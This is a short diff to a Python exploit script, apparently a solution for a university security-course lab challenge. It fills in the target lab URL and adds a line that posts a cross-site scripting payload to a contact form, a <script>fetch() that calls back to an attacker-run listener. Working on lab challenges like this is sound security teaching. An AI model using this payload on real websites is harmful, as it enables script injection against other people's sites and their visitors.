@@ -3,7 +3,7 @@ import socket
 import re
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-URL = "{{CHALLENGE_URL}}"
+URL = "https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/"
 
 # For internal use only - don't use
 def get_local_ip():
@@ -55,6 +55,7 @@ print(f"Spawned listener on: {listening_url}")
 
 with requests.Session() as sess:
     # TODO implement exploit
+    sess.post(URL +"/contact", data={"contacttext": f'http://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/help?ln=<script>fetch("{listening_url}")</script>'})
 
     # Now, our listener will hopefully receive something nice for us!
     print("Waiting for an incoming request...")
